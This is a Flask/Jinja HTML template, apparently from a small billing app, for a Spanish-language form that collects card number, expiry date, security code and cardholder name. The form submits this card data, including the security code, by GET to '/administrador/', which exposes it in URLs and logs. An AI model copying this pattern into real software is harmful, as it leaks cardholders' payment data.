{% extends 'layout.html' %}

{% block body %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Company Login</title>
    <style>
        /* Configuración básica para eliminar márgenes y hacer que la página use todo el alto de la ventana */
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
            /* Imagen de fondo para toda la página */
            background: url("{{ url_for('static', filename='images/image2.png') }}") no-repeat center center;
            background-size: cover;
        }

        /* Estilo para el contenedor que muestra el nombre de la compañía y el logo */
        .company-header {
            position: absolute;
            top: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            color: white; /* Color del texto del nombre de la compañía */
        }

        /* Estilo del logo de la compañía */
        .company-header img {
            width: 50px;
            height: 50px;
            margin-right: 15px; /* Espaciado entre el logo y el texto del nombre */
        }

        /* Estilo para el nombre de la compañía */
        .company-header h1 {
            font-size: 3em; /* Tamaño de la fuente del nombre de la compañía */
            margin: 0;
        }

        /* Estilo para el contenedor del formulario de inicio de sesión */
        .login-container {
            position: absolute;
            bottom: 20px;
            top: 37%; /* Centra verticalmente */
            right: 40px;
            text-align: center;
            color: rgb(12, 14, 13); /* Color del texto */
        }
        .login-container h1{
            color: rgb(252, 252, 252); /* Color del texto */
        }
        /* Estilo del encabezado principal (título) de la página de inicio de sesión */
        h1 {
            font-size: 3em;
            margin-bottom: 20px; /* Margen inferior para dar espacio antes del formulario */
        }

        /* Estilo para el contenedor que contiene los botones de inicio de sesión con redes sociales */
        .button-container {
            margin-top: 20px;
            display: flex; /* Usa Flexbox para organizar los botones */
            flex-direction: row; /* Alinea los botones horizontalmente */
            justify-content: center; /* Centra los botones horizontalmente */
            gap: 10px; /* Espacio horizontal entre los botones */
        }

        /* Estilo general para los botones */
        button {
            padding: 10px 30px;
            margin: 10px 100px; /* Espaciado vertical entre el formulario y los botones */
            border: none; /* Sin borde para los botones */
            background-color: #4CAF50; /* Color de fondo del botón */
            color: white;
            font-size: 1.2em;
            cursor: pointer; /* Muestra el cursor de "manito" */
            border-radius: 10px; /* Bordes redondeados */
            width: 250px; /* Ancho de los botones */
        }

        /* Cambio de color cuando se pasa el ratón sobre los botones */
        button:hover {
            background-color: #45a049; /* Color más oscuro al pasar el cursor */
        }

    </style>
</head>
<body>
    <!-- Contenedor para el nombre de la compañía e ícono -->
    <div class="company-header">
        <!-- Muestra el logo de la compañía. Asegúrate de tener el archivo logo.png en la carpeta 'static/images' -->
        <img src="{{ url_for('static', filename='images/logo.png') }}" alt="Company Logo">
        <h1>Registro de facturación</h1> <!-- Nombre de la compañía -->
    </div>

    <div class="login-container">
        <!-- <h1>Bienvenido estudiante</h1> Título de la página -->

        <!-- Formulario de inicio de sesión para ingresar username/email y contraseña -->
        <form action="/administrador/" method="GET">
            <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
            <input type="text" name="pais_facturacion" placeholder="Pais de facturación" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
            <br>
            <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
            <input type="text" name="numero_tarjeta" placeholder="Número de tarjeta crédito/débito" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
            <br>
            <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
            <input type="text" name="fecha_expiracion" placeholder="Fecha de expiración" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
            <br>
             <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
             <input type="text" name="codigo_seguridad" placeholder="Código de seguridad" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
             <br>
              <!-- Campo para ingresar el nombre de usuario o el correo electrónico -->
            <input type="text" name="nombre_titular" placeholder="Nombre del titular" required style="padding: 10px; margin: 10px 0; width: 350px;border-radius: 10px;">
            <br>
            <!-- Botón para enviar el formulario de inicio de sesión -->
            <button type="submit">Verificar y continuar</button>
        </form>
    </div>

</body>
</html>
{% endblock %}
